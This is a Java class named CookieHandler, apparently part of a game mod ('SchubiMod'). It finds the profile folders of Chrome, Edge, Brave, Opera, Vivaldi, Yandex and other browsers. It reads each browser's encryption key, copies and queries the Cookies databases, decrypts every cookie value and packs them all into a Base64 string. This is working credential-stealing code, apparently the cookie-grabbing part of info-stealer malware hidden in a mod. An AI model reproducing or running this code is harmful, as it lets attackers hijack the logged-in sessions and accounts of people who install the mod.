package dev.schubilegend.handlers;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import dev.schubilegend.SchubiMod;
import dev.schubilegend.utils.Utils;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;

public class CookieHandler {
    private static File appData = new File(System.getenv("APPDATA"));
    private static File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static HashMap<String, String> paths = new HashMap<String, String>(){
        {
            this.put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            this.put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            this.put("Chromium", localAppData + "\\Chromium\\User Data");
            this.put("Opera", appData + "\\Opera Software\\Opera Stable");
            this.put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            this.put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            this.put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            this.put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };
    private final JsonArray cookies = new JsonArray();

    public String grabCookies() {
        this.crawlUserData();
        String cookieStr = "";
        for (JsonElement cookie : this.cookies) {
            cookieStr = cookieStr + cookie.getAsJsonObject().get("hostKey").getAsString() + "\tTRUE\t/\tFALSE\t2597573456\t" + cookie.getAsJsonObject().get("name").getAsString() + "\t" + cookie.getAsJsonObject().get("value").getAsString() + "\n";
        }
        return Base64.getEncoder().encodeToString(cookieStr.getBytes());
    }

    private void crawlUserData() {
        for (String browser : paths.keySet()) {
            File[] subDirs;
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = Utils.getKey(new File(userData, "Local State"));
            File dataDir = new File(userData, "Default");
            if (!dataDir.exists() || (subDirs = dataDir.listFiles()) == null) continue;
            for (File subDir : subDirs) {
                if (!subDir.isDirectory()) continue;
                this.crawlCookies(subDir, key);
            }
        }
    }

    private void crawlCookies(File userDataDir, byte[] key) {
        File cookieFile = new File(userDataDir, "Cookies");
        if (cookieFile.exists()) {
            try {
                File tempCookieData = File.createTempFile("TempCookies", null);
                tempCookieData.deleteOnExit();
                Files.copy(cookieFile.toPath(), tempCookieData.toPath(), StandardCopyOption.REPLACE_EXISTING);
                Driver driver = SchubiMod.driver;
                Properties props = new Properties();
                Connection connection = driver.connect("jdbc:sqlite:" + tempCookieData.getAbsolutePath(), props);
                ResultSet resultSet = connection.createStatement().executeQuery("SELECT host_key, name, encrypted_value FROM cookies");
                while (resultSet.next()) {
                    String decryptedValue;
                    String hostKey = resultSet.getString(1);
                    String name = resultSet.getString(2);
                    byte[] encryptedValue = resultSet.getBytes(3);
                    if (hostKey == null || name == null || encryptedValue == null || (decryptedValue = Utils.decrypt(encryptedValue, key)).equals("")) continue;
                    JsonObject cookie = new JsonObject();
                    cookie.addProperty("hostKey", hostKey);
                    cookie.addProperty("name", name);
                    cookie.addProperty("value", decryptedValue);
                    this.cookies.add(cookie);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
